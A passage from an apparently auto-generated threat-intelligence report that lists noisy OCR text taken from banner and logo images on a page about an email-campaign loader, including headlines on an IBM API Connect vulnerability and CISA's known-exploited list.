> @CVBLE. _ WHITEPAPER  CISO’s Guide to Uae eae

</details>

<details>
<summary><strong>Image 32</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_039_67a417ff8fe7.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_039_67a417ff8fe7.webp)

**Extracted Text:**
> ya ee  Ci  Add =a" @CcVBLE. as) apreferred 7 source on  Google

</details>

<details>
<summary><strong>Image 33</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_040_3d0ba9768eff.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_040_3d0ba9768eff.webp)

**Extracted Text:**
> @CcVBLE.  Singapore Cyber Agency warns of Critical IBM API Connect Vulnerability © (CVE-2025-13915)

</details>

<details>
<summary><strong>Image 34</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_041_769d21f10ba9.webp](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_041_769d21f10ba9.webp)

**Extracted Text:**
> @CcVYBLE.  CISA Known Exploited Vulnerabilities Surged 20% in 2025

</details>

<details>
<summary><strong>Image 35</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_044_c5053e864df5.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_044_c5053e864df5.png)

**Extracted Text:**
> (=) Spotify

</details>

<details>
<summary><strong>Image 36</strong> from stealth-in-layers-unmasking-loader-in-targeted-email-campaigns</summary>

**View Image:** [url_img_046_c6bf0e09492b.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_046_c6bf0e09492b.png)

**Extracted Text:**
> @cYBLE.

</details>

**OCR Summary:** 35 images processed with text extracted

---

*Generated by PEAK CTI v3.0 Multi-Source Consolidated Report*
*2026-01-08 15:21:27 UTC*